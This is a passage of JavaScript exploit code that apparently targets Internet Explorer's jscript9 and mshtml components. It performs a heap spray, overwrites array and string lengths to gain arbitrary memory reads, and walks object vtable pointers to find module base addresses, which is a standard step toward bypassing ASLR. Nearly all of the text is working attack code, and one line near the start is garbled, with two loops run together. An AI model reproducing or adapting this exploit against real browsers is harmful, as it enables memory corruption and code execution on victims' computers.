       strarr[i] = aa.toUpperCase();
       arrarr[i] = new Array(1,2,3,4,5);
     }
     //heap-spray with pointers to a String object
     for(var i=0;i0x80000000) {
       return -(0xFFFFFFFF - i + 1);
     } else {
       return i;
     }
    }
    //signed to unsigned conversion
    function s2u(i) {
     if(i<0) {
       return (0xFFFFFFFF + i + 1);
     } else {
       return i;
     }
    }
    //memory disclosure helper function, read 32-bit number from a given address
    function read32(addrhi, addrlo) {
     arrarr[arrindex][strobjidx + 6] = u2s(addrlo);
     arrarr[arrindex][strobjidx + 7] = addrhi;
     return strarr[strindex].charCodeAt(0) + 0x10000 * strarr[strindex].charCodeAt(1);
    }
    //memory disclosure helper function, read 16-bit number from a given address
    function read16(addrhi, addrlo) {
     arrarr[arrindex][strobjidx + 6] = u2s(addrlo);
     arrarr[arrindex][strobjidx + 7] = addrhi;
     return strarr[strindex].charCodeAt(0);
    }
    function afterSecondOverwrite() {
     arrindex = arrindex + 1;
     //adjusts the array length - gives us some space to read and write memory
     arrarr[arrindex][2+0x5000/4] = 0;
     //search for the next string object and overwrite its length and content ptr to write jscript9
     for(var i=1;i<=5;i++) {
       if((arrarr[arrindex][2 + i*0x400 - 0x20] == 2) && (arrarr[arrindex][3 + i*0x400 - 0x20] == 0)) {
         //alert("found");
         strobjidx = i*0x400 - 0x20 - 2;
         arrarr[arrindex][strobjidx+4] = 4;
         for(var j=20000;j<30000;j++) {
           if(strarr[j].length != 2) {
             strindex = j;
             break;
           }
         }
         break;
       }
     }
     if(strindex < 0) {
       alert("Exploit failed, couldn't overwrite string length");
       return;
     }
     //alert("mshtml");
     //create a mshtml object and follow references to its vtable ptr
     var lo1,hi1,lo2,hi2;
     arrarr[arrindex+1][0] = document.createElement("button");
     lo1 = s2u(arrarr[arrindex][6+0x28/4]);
     hi1 = arrarr[arrindex][6+0x28/4 + 1];
     lo2 = read32(hi1, lo1+0x18);
     hi2 = read32(hi1, lo1+0x18+4);
     mshtmllo = read32(hi2, lo2+0x20);
     mshtmlhi = read32(hi2, lo2+0x20+4);
     //find the module base